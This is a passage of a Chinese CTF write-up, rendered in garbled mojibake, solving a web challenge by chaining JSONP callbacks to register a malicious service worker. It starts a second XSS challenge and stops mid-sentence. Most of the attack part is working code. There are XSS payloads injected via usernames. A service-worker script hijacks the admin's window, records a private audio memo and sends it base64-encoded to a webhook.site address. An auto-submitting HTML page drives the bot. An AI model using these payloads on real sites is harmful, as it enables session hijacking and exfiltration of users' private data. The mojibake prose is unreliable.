ç«¯ç‚¹ï¼Œä¸€ä¸ªæ³¨å†ŒæœåŠ¡å·¥ä½œè€…å¹¶å°†è„šæœ¬ URL æŒ‡å‘å¦ä¸€ä¸ª JSONP ç«¯ç‚¹ï¼Œç¬¬äºŒä¸ª JSONP ç«¯ç‚¹éœ€è¦è¿è¡Œ<code>importScripts()</code>å¹¶æŒ‡å‘ä¸€ä¸ªå…·æœ‰JSæˆ‘ä»¬æ§åˆ¶ã€‚</p></blockquote><p>è¿™æ˜¯è¿™é“é¢˜ç›®æœ€æ ¸å¿ƒçš„åœ°æ–¹ï¼Œä¹Ÿæ˜¯å¾ˆå·§å¦™çš„åœ°æ–¹ã€‚å› ä¸ºJSONPç«¯ç‚¹å¯ä»¥å›è°ƒä»»æ„å‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ³¨å†Œä¸€ä¸ªserviceæ¥ä½¿ç”¨å¤–éƒ¨çš„jsæ–‡ä»¶ï¼ŒåŒæ—¶é€šè¿‡importScripts()å¯¼å…¥ã€‚è¿™æ ·æˆ‘ä»¬å°±èƒ½æ‰§è¡Œä¸€ä¸ªå®Œæ•´çš„ä»»æ„jsä»£ç ã€‚</p><p>è¿˜æœ‰å…³äºå¤‡å¿˜å½•è®¿é—®çš„ä»£ç ï¼Œå†è¯·æ±‚å¤´ä¸­é™åˆ¶äº†<code>Sec-Fetch-Site</code>å’Œ<code>Sec-Fetch-Dest</code>ã€‚è¿™äº›<code>Sec-Fetch</code>æ ‡å¤´é˜»æ­¢æˆ‘ä»¬ä»…è·å–éŸ³é¢‘ - å®ƒéœ€è¦æ”¾ç½®åœ¨éŸ³é¢‘æ ‡ç­¾ä¸­ã€‚è€Œä¸”æˆ‘ä»¬æ— æ³•ä»ç¼“å­˜ä¸­è·å–å®ƒï¼Œå› ä¸ºæœ‰<code>Cache-Control</code>æ ‡å¤´</p><figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js">router.get(<span class="hljs-string">&quot;/audio/file&quot;</span>, requiresLogin, <span class="hljs-keyword">async</span> (req, res) =&gt; &#123;<br>    <span class="hljs-keyword">if</span>(!db.getMemo(req.user.username)) &#123;<br>        <span class="hljs-keyword">return</span> res.status(<span class="hljs-number">404</span>).send(<span class="hljs-string">&#x27;no&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(req.header(<span class="hljs-string">&#x27;Sec-Fetch-Dest&#x27;</span>) !== <span class="hljs-string">&quot;audio&quot;</span> || req.header(<span class="hljs-string">&#x27;Sec-Fetch-Site&#x27;</span>) !== <span class="hljs-string">&quot;same-origin&quot;</span>) &#123;<br>        <span class="hljs-keyword">return</span> res.status(<span class="hljs-number">404</span>).send(<span class="hljs-string">&#x27;no&#x27;</span>);<br>    &#125;<br><br>    res.setHeader(<span class="hljs-string">&#x27;content-type&#x27;</span>, <span class="hljs-string">&#x27;audio/mpeg&#x27;</span>);<br>    res.sendFile(db.getMemo(req.user.username), &#123; <span class="hljs-attr">root</span>: <span class="hljs-string">&quot;.&quot;</span> &#125;);<br>&#125;);<br></code></pre></div></td></tr></table></figure><h3 id="æ”»å‡»æ“ä½œ"><a href="#æ”»å‡»æ“ä½œ" class="headerlink" title="æ”»å‡»æ“ä½œ"></a>æ”»å‡»æ“ä½œ</h3><p>åˆ©ç”¨fetchå…ˆæ³¨å†Œï¼Œä¹Ÿå¯ä»¥æŠ“åŒ…ç­‰ç­‰</p><figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js">fetch(<span class="hljs-string">&quot;/api/register&quot;</span>, &#123;<br>    method: <span class="hljs-string">&quot;POST&quot;</span>,<br>    headers: &#123;<br>        <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span><br>    &#125;,<br>    body: <span class="hljs-string">&quot;username=&quot;</span> + <span class="hljs-built_in">encodeURIComponent</span>(<span class="hljs-string">`//39.107.239.30:2333/notekeeper.js?#&lt;iframe srcdoc=&quot;&lt;script src=&#x27;/api/notes/list?callback=window.parent.navigator.serviceWorker.register&#x27;&gt;&lt;/script&gt;&quot;&gt;&lt;/iframe&gt;`</span>) + <span class="hljs-string">&quot;&amp;username=b&amp;password=12345&quot;</span><br>&#125;);<br></code></pre></div></td></tr></table></figure><p>ç™»å½•æˆåŠŸåä¼šè‡ªè¡Œæ‰§è¡Œï¼Œ</p><figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js">&lt;iframe srcdoc=<span class="hljs-string">&quot;&lt;script src=&#x27;/api/notes/list?callback=window.parent.navigator.serviceWorker.register&#x27;&gt;&lt;/script&gt;&quot;</span>&gt;&lt;/iframe&gt;<br></code></pre></div></td></tr></table></figure><p>ä½†æ˜¯æ­¤æ—¶notesä¸­æˆ‘ä»¬å¹¶æ²¡æœ‰æ·»åŠ ä»»ä½•ä¸œè¥¿æ‰€ä»¥å®ƒæ˜¯è¿™æ ·çš„</p><p><img src="https://img-blog.csdnimg.cn/1108c6bf7c184f9bbbacdccd53572cd1.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>åœ¨è¿™é‡Œæˆ‘ä»¬å¦‚æœç›´æ¥å†™ä¸€ä¸ªnotesç±»ä¼¼äº<code>//39.107.239.30:2333/sw.js</code>ï¼Œç„¶åå˜æˆ</p><figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js"><span class="hljs-comment">/**/</span> <span class="hljs-keyword">typeof</span> <span class="hljs-built_in">window</span>.parent.navigator.serviceWorker.register === <span class="hljs-string">&#x27;function&#x27;</span> &amp;&amp; <span class="hljs-built_in">window</span>.parent.navigator.serviceWorker.register([<span class="hljs-string">&quot;//39.107.239.30:2333/sw.js&quot;</span>])<br></code></pre></div></td></tr></table></figure><p>è¿™çœ‹ä¼¼å¾ˆåˆç†ä½†å®é™…ä¸Šä¼šæ˜¯è¿™æ ·çš„</p><p><img src="https://img-blog.csdnimg.cn/959bfd9e1e654619af4ff1b156cd20c0.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ‰€ä»¥å‡ºé¢˜äººæ‰€è¯´çš„<code>æ§åˆ¶ä¸¤ä¸ª JSONP ç«¯ç‚¹</code>ä¸€ä¸ªæ˜¯æ³¨å†Œçš„æ—¶å€™åˆ©ç”¨ä¸€æ¬¡jsonpç«¯ç‚¹å›è°ƒï¼Œå¦å¤–ä¸€æ¬¡åœ¨äºè¿™é‡Œå†™å…¥notesï¼Œè¿™æ ·çš„è¯ä¾¿å†ä¸€æ¬¡é€šè¿‡jsonpçš„è·¨åŸŸç‰¹ç‚¹ç»•è¿‡åŒæºç­–ç•¥ã€‚</p><figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js">/api/user/info?callback=importScripts<br></code></pre></div></td></tr></table></figure><p>å…¶å®åšåˆ°è¿™é‡Œæœ€å¼€å§‹æˆ‘åœ¨æƒ³ä¸ºä»€ä¹ˆä¸ç›´æ¥importScriptsæˆ‘ä»¬çš„æ–‡ä»¶ä¸å°±å¾—äº†ï¼Œç„¶ååœ¨æœ€ååŠ ä¸€ä¸ªæ³¨é‡Šç¬¦ï¼Œç±»ä¼¼äº</p><figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js">/api/user/info?callback=importScripts(<span class="hljs-string">&#x27;//vps:port/notekeeper.js&#x27;</span>);<span class="hljs-comment">//</span><br></code></pre></div></td></tr></table></figure><p>ä½†æ˜¯å®è·µè¯å®æºç ä¸­ä½¿ç”¨çš„æ˜¯<code>res.jsonp()</code>ï¼Œæ‰€ä»¥åœ¨å®˜æ–¹expressçš„jsonpä¸­è¿›è¡Œäº†ä¸€äº›è¿‡æ»¤ã€‚å®ƒä¼šå˜æˆè¿™æ ·</p><p><img src="https://img-blog.csdnimg.cn/56352d835ea54cf4b2022b2f8c7efdd9.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ‰€ä»¥æ­£ç¡®å¯¼å…¥åï¼Œæœ€åçš„ç»“æœä¼šæ˜¯è¿™æ ·</p><p><img src="https://img-blog.csdnimg.cn/8fa4fbd59b044aa3a28977d03ab3a475.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><img src="https://img-blog.csdnimg.cn/5df5056ff00a41b6887e60e255ae83c5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è¿™æ ·å°±å¼•å…¥äº†æˆ‘ä»¬å¤–éƒ¨çš„jsæ–‡ä»¶ï¼Œå¹¶ä¸”å¯ä»¥å®Œæ•´çš„æ‰§è¡Œä»»æ„jsä»£ç ã€‚æ‰€ä»¥è¿™é‡Œçš„jsä»£ç å¦‚ä½•ç”¨æ¥çªƒå–å¤‡å¿˜å½•å‘¢ã€‚</p><p>æœ€å¼€å§‹å…¶å®è¯´åˆ°äº†ä¸€ä¸ªservice workeræ˜¯å¯ä»¥æ‹¦æˆªä¸€ä¸ªfetchè¯·æ±‚çš„ï¼Œå¹¶ä¸”å¯ä»¥ç¯¡æ”¹responceã€‚æ‰€ä»¥è¿™é‡Œå¦‚æœå¯ä»¥è®©adminåœ¨è®¿é—®æˆ‘ä»¬æä¾›çš„ç•Œé¢æ—¶è¯·æ±‚å¦ä¸€ä¸ªç•Œé¢ï¼Œé‚£æˆ‘ä»¬æ˜¯ä¸æ˜¯å°±å¯ä»¥æ‹¦æˆªè¿™ä¸ªè¯·æ±‚ï¼Œç„¶åæ‰§è¡Œæˆ‘ä»¬è‡ªå·±çš„ä»£ç ã€‚å¹¶ä¸”åˆ©ç”¨jsä»£ç æ˜¯å¯ä»¥å°†mp3çš„æ–‡ä»¶å†…å®¹è¿›è¡Œæ’­æ”¾å¹¶è½¬æ¢æˆbaseç¼–ç çš„ã€‚åŒæ—¶ä½ å¯ä»¥çœ‹åˆ°botçš„jsæ–‡ä»¶ã€‚botçš„å®ç°ä¸­ï¼Œä¼šå…ˆå»è®¿é—®æˆ‘ä»¬æä¾›çš„urlï¼Œç„¶åæ‰ä¼šå›åˆ°/homeï¼Œæœ€åæ˜¯è¿›è¡Œç™»å‡ºã€‚çœ‹åˆ°å‡ºé¢˜äººçš„è®°å½•è¿˜å¯ä»¥å‘ç°ï¼Œå…¶å®æˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨æ‹¦æˆªè¿‡ç¨‹ä¸­å°†clickç‚¹å‡»åçš„ç»“æœç›´æ¥è¿›è¡Œæ›¿æ¢ï¼Œè®©botæ°¸è¿œåœç•™ï¼Œæ’­æ”¾æˆ‘ä»¬è¦çªƒå–çš„MP3æ–‡ä»¶ã€‚</p><p><img src="https://img-blog.csdnimg.cn/97feae30d51d41d2ab2a06880910dc06.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ‰€ä»¥å¦‚ä½•è®©adminè®¿é—®æ—¶è¯·æ±‚å¦ä¸€ä¸ªç•Œé¢ï¼Œå¯ä»¥é€šè¿‡æ§åˆ¶jsonpå‡½æ•°è¿›è¡Œwindow.openerçš„å›è°ƒå°±å¯ä»¥äº†ï¼ç„¶ååœ¨service workerä¸­ç”¨window.opener.originå›åˆ°æœ€åˆçš„çª—å£ã€‚ç„¶åé€šè¿‡domæ‰¾åˆ°æˆ‘ä»¬éœ€è¦çš„audioï¼Œè¿›è¡Œå½•åˆ¶ã€‚</p><h3 id="æœ€ç»ˆçš„æ”»å‡»æµç¨‹"><a href="#æœ€ç»ˆçš„æ”»å‡»æµç¨‹" class="headerlink" title="æœ€ç»ˆçš„æ”»å‡»æµç¨‹"></a>æœ€ç»ˆçš„æ”»å‡»æµç¨‹</h3><p>é¦–å…ˆéœ€è¦äº‹å…ˆæ³¨å†Œä¸¤ä¸ªç”¨æˆ·ï¼Œä¸€ä¸ªç”¨æ¥å¼•ç”¨å¤–éƒ¨çš„jsæ–‡ä»¶ï¼Œå¦‚ä¸Šã€‚æ³¨å†Œçš„service worker jsä»£ç ä¸º</p><figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js">self.addEventListener(<span class="hljs-string">&#x27;fetch&#x27;</span>, <span class="hljs-keyword">async</span> (e) =&gt; &#123;<br>    <span class="hljs-keyword">if</span>(e.request.url.includes(<span class="hljs-string">&quot;/api/user/strellpwn&quot;</span>)) &#123;<br>        e.respondWith(<span class="hljs-keyword">new</span> Response(<span class="hljs-keyword">new</span> Blob([<span class="hljs-string">`</span><br><span class="hljs-string">&lt;script&gt;</span><br><span class="hljs-string">const webhook = &quot;https://webhook.site/1635fdff-7154-4586-b16c-dbc680be9f75&quot;;</span><br><span class="hljs-string"></span><br><span class="hljs-string">const log = (body) =&gt; &#123;</span><br><span class="hljs-string">    console.log(body);</span><br><span class="hljs-string">    fetch(webhook, &#123;</span><br><span class="hljs-string">        method: &quot;POST&quot;,</span><br><span class="hljs-string">        body,</span><br><span class="hljs-string">        mode: &quot;no-cors&quot;</span><br><span class="hljs-string">    &#125;);</span><br><span class="hljs-string">&#125;;</span><br><span class="hljs-string"></span><br><span class="hljs-string">const blobToBase64 = (blob) =&gt; &#123;</span><br><span class="hljs-string">  return new Promise((resolve, _) =&gt; &#123;</span><br><span class="hljs-string">    const reader = new FileReader();</span><br><span class="hljs-string">    reader.onloadend = () =&gt; resolve(reader.result);</span><br><span class="hljs-string">    reader.readAsDataURL(blob);</span><br><span class="hljs-string">  &#125;);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">const pwn = () =&gt; &#123;</span><br><span class="hljs-string">    try &#123;</span><br><span class="hljs-string">        window.opener.origin;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    catch(err) &#123;</span><br><span class="hljs-string">        console.log(&quot;still cross origin...&quot;);</span><br><span class="hljs-string">        setTimeout(pwn, 500);</span><br><span class="hljs-string">        return;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    try &#123;</span><br><span class="hljs-string">        window.opener.document.body.querySelector</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    catch(err) &#123;</span><br><span class="hljs-string">        console.log(&quot;page same-origin, but not loaded yet..&quot;);</span><br><span class="hljs-string">        setTimeout(pwn, 500);</span><br><span class="hljs-string">        return;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    let aud = window.opener.document.body.querySelector(&quot;audio&quot;);</span><br><span class="hljs-string">    if(!aud) &#123;</span><br><span class="hljs-string">        console.log(&quot;audio tag missing...&quot;);</span><br><span class="hljs-string">        setTimeout(pwn, 500);</span><br><span class="hljs-string">        return;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    let stream = aud.captureStream();</span><br><span class="hljs-string">    let rec = new MediaRecorder(stream);</span><br><span class="hljs-string"></span><br><span class="hljs-string">    log(&quot;found_audio&quot;);</span><br><span class="hljs-string">    console.log(aud);</span><br><span class="hljs-string"></span><br><span class="hljs-string">    let btn = window.opener.document.querySelector(&quot;form[action=&#x27;/api/logout&#x27;] button&quot;);</span><br><span class="hljs-string">    if(!btn) &#123;</span><br><span class="hljs-string">        log(&quot;logout button missing!!!&quot;);</span><br><span class="hljs-string">        return;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    btn.onclick = (e) =&gt; &#123;</span><br><span class="hljs-string">        e.preventDefault();</span><br><span class="hljs-string">        aud.play();</span><br><span class="hljs-string">    &#125;;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    aud.onplay = () =&gt; &#123;</span><br><span class="hljs-string">        log(&quot;recording&quot;);</span><br><span class="hljs-string">        let chunks = [];</span><br><span class="hljs-string">        rec.ondataavailable = e =&gt; chunks.push(e.data);</span><br><span class="hljs-string">        rec.onstop = async e =&gt; &#123;</span><br><span class="hljs-string">            let final = new Blob(chunks, &#123;</span><br><span class="hljs-string">                type: &#x27;audio/mpeg&#x27;</span><br><span class="hljs-string">            &#125;);</span><br><span class="hljs-string">            let b64 = await blobToBase64(final);</span><br><span class="hljs-string">            log(b64);</span><br><span class="hljs-string">            console.log(&quot;done~&quot;);</span><br><span class="hljs-string">        &#125;;</span><br><span class="hljs-string">        rec.start();</span><br><span class="hljs-string">    &#125;;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    log(&quot;ready...&quot;);</span><br><span class="hljs-string">&#125;;</span><br><span class="hljs-string"></span><br><span class="hljs-string">window.onload = () =&gt; &#123;</span><br><span class="hljs-string">    if(window.opener.name !== &quot;pwning&quot;) return window.close();</span><br><span class="hljs-string">    setTimeout(() =&gt; window.open(&quot;&quot;, &quot;lmao&quot;).close(), 3000);</span><br><span class="hljs-string">    log(&quot;loaded&quot;);</span><br><span class="hljs-string">    console.log(&quot;loaded&quot;);</span><br><span class="hljs-string">    pwn();</span><br><span class="hljs-string">&#125;;</span><br><span class="hljs-string">&lt;/script&gt;</span><br><span class="hljs-string">        `</span>], &#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;text/html&#x27;</span> &#125;)));<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span>;<br>&#125;);<br></code></pre></div></td></tr></table></figure><p>å¦å¤–ä¸€ä¸ªéœ€è¦æ³¨å†Œæ¥è®©adminè¯·æ±‚å¦å¤–çš„çª—å£</p><figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js">fetch(<span class="hljs-string">&quot;/api/register&quot;</span>, &#123;<br>    method: <span class="hljs-string">&quot;POST&quot;</span>,<br>    headers: &#123;<br>        <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span><br>    &#125;,<br>    body: <span class="hljs-string">&quot;&amp;username=&quot;</span> + <span class="hljs-built_in">encodeURIComponent</span>(<span class="hljs-string">`/api/user/strellpwn?#&lt;iframe async srcdoc=&quot;&lt;script src=&#x27;/api/user/info?callback=window.parent.open&#x27;&gt;&lt;/script&gt;&quot;&gt;&lt;/iframe&gt;`</span>) + <span class="hljs-string">&quot;&amp;username=b&amp;password=12345&quot;</span><br>&#125;);<br></code></pre></div></td></tr></table></figure><p>ç„¶åå†™ä¸€ä¸ªhtmlï¼Œèµ·ä¸€ä¸ªç›‘å¬æœåŠ¡ï¼Œè®©botè®¿é—®å»ç™»å½•</p><figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js">&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>    &lt;body&gt;<br>        &lt;form method=<span class="hljs-string">&quot;POST&quot;</span> action=<span class="hljs-string">&quot;http://127.0.0.1:9999/api/login&quot;</span> target=<span class="hljs-string">&quot;lmao&quot;</span>&gt;<br>            &lt;input name=<span class="hljs-string">&quot;username&quot;</span> /&gt;<br>            &lt;input name=<span class="hljs-string">&quot;username&quot;</span> value=<span class="hljs-string">&quot;b&quot;</span> /&gt;<br>            &lt;input name=<span class="hljs-string">&quot;password&quot;</span> /&gt;<br>        &lt;/form&gt;<br>        &lt;script&gt;<br>            <span class="hljs-keyword">const</span> sleep = <span class="hljs-function">(<span class="hljs-params">ms</span>) =&gt;</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function"><span class="hljs-params">r</span> =&gt;</span> <span class="hljs-built_in">setTimeout</span>(r, ms));<br>            <span class="hljs-built_in">window</span>.onload = <span class="hljs-keyword">async</span> () =&gt; &#123;<br>                <span class="hljs-keyword">let</span> $ = <span class="hljs-built_in">document</span>.querySelector.bind(<span class="hljs-built_in">document</span>);<br>                navigator.sendBeacon(<span class="hljs-string">&quot;https://webhook.site/1635fdff-7154-4586-b16c-dbc680be9f75&quot;</span>, <span class="hljs-string">&quot;start&quot;</span>);<br><br>                $(<span class="hljs-string">&quot;input[name=username]&quot;</span>).value = <span class="hljs-string">`//39.107.239.30:2333/notekeeper.js?#&lt;iframe srcdoc=&quot;&lt;script src=&#x27;/api/notes/list?callback=window.parent.navigator.serviceWorker.register&#x27;&gt;&lt;/sc`</span> + <span class="hljs-string">`ript&gt;&quot;&gt;&lt;/iframe&gt;`</span>;<br>                $(<span class="hljs-string">&quot;input[name=password]&quot;</span>).value = <span class="hljs-string">`12345`</span>;<br>                $(<span class="hljs-string">&quot;form&quot;</span>).submit();<br><br>                <span class="hljs-keyword">await</span> sleep(<span class="hljs-number">2500</span>);<br><br>                $(<span class="hljs-string">&quot;input[name=username]&quot;</span>).value = <span class="hljs-string">`/api/user/strellpwn?#&lt;iframe srcdoc=&quot;&lt;script src=&#x27;/api/user/info?callback=window.parent.open&#x27;&gt;&lt;/sc`</span> + <span class="hljs-string">`ript&gt;&quot;&gt;&lt;/iframe&gt;`</span>;<br>                $(<span class="hljs-string">&quot;input[name=password]&quot;</span>).value = <span class="hljs-string">`12345`</span>;<br>                $(<span class="hljs-string">&quot;form&quot;</span>).submit();<br><br>                <span class="hljs-built_in">window</span>.name = <span class="hljs-string">&quot;pwning&quot;</span>;<br>                navigator.sendBeacon(<span class="hljs-string">&quot;https://webhook.site/1635fdff-7154-4586-b16c-dbc680be9f75&quot;</span>, <span class="hljs-string">&quot;end&quot;</span>);<br>                location.href = <span class="hljs-string">&quot;http://127.0.0.1:9999/home?gogogo&quot;</span>;<br>            &#125;;<br>        &lt;/script&gt;<br>    &lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></div></td></tr></table></figure><p>è®¿é—®æˆåŠŸæ—¶å¯ä»¥çœ‹åˆ°ï¼Œbotå¹¶æ²¡æœ‰ç™»å‡ºï¼Œä¹Ÿå¯ä»¥çœ‹åˆ°æˆåŠŸè®¿é—®äº†ä¸¤ä¸ªè´¦æˆ·ã€‚</p><p><strong><img src="https://img-blog.csdnimg.cn/f9a046d57de543fa9542853139987f8b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></strong></p><p>ä½†æ˜¯ç”±äºå¯èƒ½jså½•éŸ³éŸ³é¢‘çš„åŸå› ï¼Œåœ¨webhook.siteä¸­ä¼šç­‰å¾…çš„æœ‰äº›æ…¢ï¼Œæ‰€ä»¥éœ€è¦å¤šè®©botè®¿é—®å‡ æ¬¡ã€‚æœ€ç»ˆèƒ½å¤Ÿçœ‹åˆ°ï¼ŒæˆåŠŸçªƒå–åˆ°ç®¡ç†å‘˜è¯­éŸ³å¤‡å¿˜å½•ã€‚</p><p><img src="https://img-blog.csdnimg.cn/edb0fdb735ab4d53a5183118ef4e3978.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><img src="https://img-blog.csdnimg.cn/210f9de4194241bbb5a08b9e2f3a48d6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æœ€åå°†baseç¼–ç æ”¾å…¥srcæ ‡ç­¾ä¸­å°±å¯ä»¥çš„åˆ°éŸ³é¢‘äº†</p><p><img src="https://img-blog.csdnimg.cn/aabb695e8efc4d9595ffcdd599a46266.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="è¥¿æ¹–è®ºå‰‘2020xss"><a href="#è¥¿æ¹–è®ºå‰‘2020xss" class="headerlink" title="è¥¿æ¹–è®ºå‰‘2020xss"></a>è¥¿æ¹–è®ºå‰‘2020xss</h2><p>è¿™ä¹Ÿæ˜¯ä¸€é“å¯ä»¥åˆ©ç”¨service workerçš„é¢˜ç›®ï¼Œä½†æ¯”ä¸Šé¢çš„é‚£é¢˜è¦ç®€å•ä¸€äº›ã€‚ä½†æ˜¯ç”±äºæ²¡æœ‰ç¯å¢ƒæ‰€ä»¥å°±æ¥çœ‹çœ‹æ€è·¯å§ã€‚</p><p>å…³é”®æºç ï¼Œé¦–å…ˆå¯ä»¥å¯ä»¥çœ‹åˆ°auto_reg_var()å‡½æ•°å­˜åœ¨å˜é‡è¦†ç›–ï¼Œæ•…å¯ä»¥å°†callbackå˜é‡è¦†ç›–æ‰ï¼Œä¸”jsonpè¿”å›çš„æ•°æ®ä¼šè¢«å½“åšjsä»£ç 